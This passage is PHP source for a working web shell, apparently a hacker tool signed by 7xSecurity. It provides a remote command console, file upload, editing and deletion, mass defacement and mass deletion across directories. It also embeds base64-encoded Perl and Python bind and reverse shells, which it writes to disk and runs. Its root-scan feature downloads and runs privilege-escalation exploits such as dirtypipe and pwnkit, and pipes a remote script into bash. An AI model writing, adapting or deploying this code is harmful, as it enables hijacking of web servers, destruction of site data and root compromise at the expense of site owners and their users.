		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled !";
	}
}
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p &0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($_7['dir'])) {
	$dir = unhex($_7['dir']);
	chdir($dir);
} else {
	$dir = hex($gcw());
}
echo "
<html>
	<head>
		<meta charset='UTF-8'>
		<meta name='author' content='7xSecurity'>
		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
		<link rel='stylesheet' href='//xnxx.co.ws/meki.css'>
		<link rel='icon' href='//xnxx.co.ws/anya.jpg'>
		<title>Pdf To php by sigantenghaxor</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Walau satumalam akan selalu ku kenang :(</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
				$path = $gcw();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					echo "<i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' href='?path=".hex('/')."'>/</a>";
				continue;
			}
			if($pat == '') continue;
				echo "<a class='text-decoration-none' href='?path=";
				for($i=0;$i<=$id;$i++){
				echo hex($paths[$i]);
			if($i != $id) echo hex("/");
			}
			echo "'>".$pat."</a>/";
			}
			$scand = scandir($path);
			echo "&nbsp;[ ".w($path, p($path))." ]";
			$sql = ($GLOBALS['fungsi'][5]('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$curl = ($GLOBALS['fungsi'][5]('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$wget = (exe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pl = (exe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$py = (exe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$disfunc = @ini_get("disable_functions");
			$kernel = php_uname();
			$phpver = PHP_VERSION;
			$phpos = PHP_OS;
			$soft = $_SERVER["SERVER_SOFTWARE"];
			$ip = gethostbyname($_SERVER['HTTP_HOST']);
			if (empty($disfunc)) {
				$disfc = "<gr>NONE</gr>";
			} else {
				$disfc = "<rd>$disfunc</rd>";
			}
			if(!$GLOBALS['fungsi'][5]('posix_getegid')) {
				$user = @get_current_user();
				$uid = @getmyuid();
				$gid = @getmygid();
				$group = "?";
			} else {
				$uid = @posix_getpwuid(posix_geteuid());
				$gid = @posix_getgrgid(posix_getegid());
				$user = $uid['name'];
				$uid = $uid['uid'];
				$group = $gid['name'];
				$gid = $gid['gid'];
			}
			$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
		echo "
		<div class='container-fluid'>
			<div class='corner anu py-3'>
				<button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'><i class='bi bi-info-circle'></i> info <i class='bi bi-chevron-down'></i></button>
			</div>
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-light p-3 rounded-3'>
				System: <gr>$kernel</gr><br>
				Software: <gr>$soft</gr><br>
				PHP version: <gr>$phpver</gr> <a class='text-decoration-none' href='?dir=".hex($fungsi[7]())."&id=phpinfo'>[ PHPINFO ]</a> PHP os: <gr>$phpos</gr><br>
				Server Ip: <gr>$ip</gr><br>
				Your Ip: <gr>".ia()."</gr><br>
				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
				Safe Mode: $sm<br>
				MySQL: $sql | Perl: $pl | Python: $py | WGET: $wget | CURL: $curl<br>
				Disable Function:<br><pre>$disfc</pre>
				</div>
			</div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
				
			</div>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
				<a class='btn btn-outline-light btn-sm' data-toggle='modal' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
				<a class='btn btn-outline-light btn-sm' href='?left'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
			</div>
		</div>";
		if(isset($_7['dir'])) {
			$dir = unhex($_7['dir']);
			chdir($dir);
		} else {
			$dir = hex($gcw());
		}
		$dir = str_replace("\\","/",$dir);
		$scdir = explode("/", $dir);	
		for($i = 0; $i <= $c_dir; $i++) {
			$scdir[$i];
			if($i != $c_dir) {
		}
		if($_7['id'] == 'lockshell'){
		    $mass = fopen("test.txt", "w");fwrite($mass, "test");
		     }
		if($_7['id'] == 'deface'){
		function mass_all($dir,$namefile,$contents_sc) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					$fungsi[2]($▚, $contents_sc);
				} elseif($dirb === '..') {
					$fungsi[2]($▚, $contents_sc);
				} else {
					if($fungsi[1]($dirc)) {
						if(is_writable($dirc)) {
							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
							$fungsi[2]($▚, $contents_sc);
							$▟ = mass_all($dirc,$namefile,$contents_sc);
							}
						}
					}
				}
			}
		}
		function mass_onedir($dir,$namefile,$contents_sc) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namefile;
					if($dirb === '.') {
						$fungsi[2]($▚, $contents_sc);
					} elseif($dirb === '..') {
						$fungsi[2]($▚, $contents_sc);
					} else {
						if($fungsi[1]($dirc)) {
							if(is_writable($dirc)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
								$fungsi[2]($▚, $contents_sc);
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			if($_7['tipe'] == 'mass') {
			mass_all($_7['d_dir'], $_7['d_file'], $_7['script']);
			} elseif($_7['tipe'] == 'onedir') {
			mass_onedir($_7['d_dir'], $_7['d_file'], $_7['script']);
			}
		}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'> Tipe:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>One dir</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>All directory</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename'>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control btn-sm' rows='7' name='script' placeholder='your script'></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm'type='submit' name='start' value='deface'>
				</div>
			</form>
		</div>";
		}
		if($_7['id'] == 'delete'){
		function mass_delete($dir,$namefile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					if(file_exists("$dir/$namefile")) {
						$GLOBALS['fungsi'][4]("$dir/$namefile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namefile")) {
						$GLOBALS['fungsi'][4]("".dirname($dir)."/$namefile");
					}
				} else {
					if($fungsi[1]($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($▚)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
								$GLOBALS['fungsi'][4]($▚);
								$▟ = mass_delete($dirc,$namefile);
								}
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			mass_delete($_7['d_dir'], $_7['d_file']);
		}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
					<i class='bi bi-file-earmark'></i> Filename:
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r><br>
					<div class='input-group-append'>
						<input class='btn btn-dark btn-sm' type='submit' name='start' value='delete'>
					</div>
				</div>
			</form>
		</div>";
		}
		if($_7['id'] == 'phpinfo'){
			@ob_start();
			@eval("phpinfo();");
			$buff = @ob_get_contents();
			@ob_end_clean();	
			$front = strpos($buff,"<body>")+6;
			$end = strpos($buff,"</body>");
			echo "<pre class='php_info'>".substr($buff,$front,$front-$front)."</pre>";
			exit;
		}
		if($_7['id'] == 'network'){
		s();
		echo "
		<div class='card text-dark'>
			<div class='card-header'>
				<form method='post'>
					<u>Bind port to /bin/sh [Perl]</u><br>
					<u>Port :</u>
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
					<input class='btn btn-dark btn-sm' type='submit' name='bpl' value='submit'>
				</div>
			<h5>Back-Connect</h5>
			<u>Server :</u>
				<input class='form-control btn-sm' type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
			<u>Port :</u>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
				<select class='form-control btn-sm' name='bc'>
					<option value='perl'>perl</option>
					<option value='python'>python</option>
				</select>
			</div>
			<div class='d-grid gap-2'>
				<input class='btn btn-dark btn-sm btn-block' type='submit' value='submit'>
			</div>
		</form>";
		if($_7['bpl']){
			$bp = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
			$brt = @fopen('bp.pl','w');
			fwrite($brt,$bp);
			$out = exe("perl bp.pl ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
			$GLOBALS['fungsi'][4]("bp.pl");
		}
		if($_7['bc'] == 'perl'){
			$bc = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
			$plbc = @fopen('bc.pl','w');
			fwrite($plbc,$bc);
			$out = exe("perl bc.pl ".$_7['server']." ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
			$GLOBALS['fungsi'][4]("bc.pl");
		}
		if($_7['bc'] == 'python'){
			$bc_py = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
			$pbc_py = @fopen('bcpy.py','w');
			fwrite($pbc_py,$bc_py);
			$out_py = exe("python bcpy.py ".$_7['server']." ".$_7['port']);
			sleep(1);
			echo "<pre>$out_py\n".exe("ps aux | grep bcpy.py")."</pre>";
			$GLOBALS['fungsi'][4]("bcpy.py");
			}
			echo "</div>
			</div>
		<br/>";
		}
		if($_7['id'] == 'cmd') {
		s();
		if(!empty($_POST['cmd'])) {
			$cmd = shell_exec($_POST['cmd'].' 2>&1');
		}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<div class='input-group mb-3'>
					<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
				</div>
			</form>";
			if($cmd):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
				</div>
			</div>';
			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><code>No result</code></pre>
				</div>
			</div>
		</div>';
		endif;
		}
		if($_7['id'] == 'upload'){
		s();
		if(isset($_7['upl'])){
			$result = count($_FILES['file']['name']);
			for($contents=0;$contents<$result;$contents++){
				$namefile = $_FILES['file']['name'][$contents];
					$up = @copy($_FILES['file']['tmp_name'][$contents],"$path/".$namefile);
				}
				if($result < 2){
					if($up){
					echo "<strong>Upload</strong> $namefile ok! ".ok()."</div>";
				}else{
				echo '<strong>Upload</strong> fail! '.er().'</div>';
				}
			}else{
			echo "<strong>Upload</strong> $result ok! ".ok()."</div>";
			}
		}
		echo "
		<div class='card card-body text-dark input-group mb-3'>
		<u>Multiple upload</u>
			<form method='POST' enctype='multipart/form-data'>
				<div class='input-group'>
					<input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r>
					<input class='btn btn-dark btn-sm' type='submit' name='upl' value='upload'>
				</div>
			</form>
		</div>";
			}
		}
		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
			ob_implicit_flush();ob_end_flush();s();
			echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=autoscan'><i class='bi bi-bug'></i> Auto scan</a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=scansd'><i class='bi bi-search'></i> Scan SUID</a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=esg'><i class='bi bi-search'></i> Exploit suggester</a>
				</div>
			</div>";if (!$GLOBALS['fungsi'][5]("proc_open")) {
				echo "<center class='anu'>Command is Disabled !</center>";
			}
			if (!is_writable($path)) {
				echo "<center class='anu'>Current Directory is Unwriteable !</center>";
			}
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/rooting/")) {
					mkdir($path."/rooting");
					exe_root("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz", $path."/rooting");
					exe_root("tar -xf auto.tar.gz", $path."/rooting");
					if (!file_exists($path."/rooting/netfilter")) {
						die("<center class='anu'>Failed to Download Material !</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe_root("timeout 10 ./rooting/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./rooting/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./rooting/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/rooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/rooting").@exe("rm -rf ./rooting | timeout 10 ").'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">[+] Scanning ...</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("find / -perm -u=s -type f 2>/dev/null", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
				echo '<center class="anu">[+] Loading ...</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			}
		}
		// openfile
		if(isset($_7['opn'])) {
			$file = $_7['opn'];
		}	
		// view
		if($_7['action'] == 'view') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<div class='bg-dark'>
			<div class='container-fluid language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars($fungsi[0]($file))."</textarea>
			</div>
		</div>";
		}
		// edit
		if(isset($_7['edit_file'])) {
		$updt = fopen("$file", "w");
		$result = fwrite($updt, $_7['contents']);		
			if ($result) {
		echo '<strong>Edit file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Edit file</strong> fail! '.er().'</div>';}
		}
		if($_7['action'] == 'edit') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>".htmlspecialchars($fungsi[0]($file))."</textarea>
			<div class='d-grid gap-2'>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		if($_7['action'] == 'rename_folder') {
			if($_7['r_d']) {
				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
				if($r_d) {
		echo '<strong>Rename folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}else{
		echo '<strong>Rename folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		if(isset($_7['r_f'])) {
			$old = $file;
			$new = $_7['new_name'];
			rename($new, $old);
			if(file_exists($new)) {
		echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
			<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
			}else{
		if(rename($old, $new)) {
		echo '<strong>Rename file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Rename file</strong> fail! '.er().'</div>';
				}
			}
		}
		if($_7['action'] == 'rename') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."' $_r>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		if ($_7['action'] == 'delete_file') {
		s();
		if ($_7['yeahx']) {
			$delete = $GLOBALS['fungsi'][4]($file);
			if ($delete) {
		echo '<strong>Delete file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Delete file</strong> fail! '.er().'</div>';
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-lightbtn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($file)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=".hex($dir)."'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		//delete folder
		if ($_7['action'] == 'delete_folder' ) {
		s();
		if ($_7['yeah']) {
			if($fungsi[1]($dir)) {
			if(is_writable($dir)) {
				@rmdir($dir);
				@exe("rm -rf $dir");
				@exe("rmdir /s /q $dir");
		echo '<strong>Delete folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				} else {
		echo '<strong>Delete folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
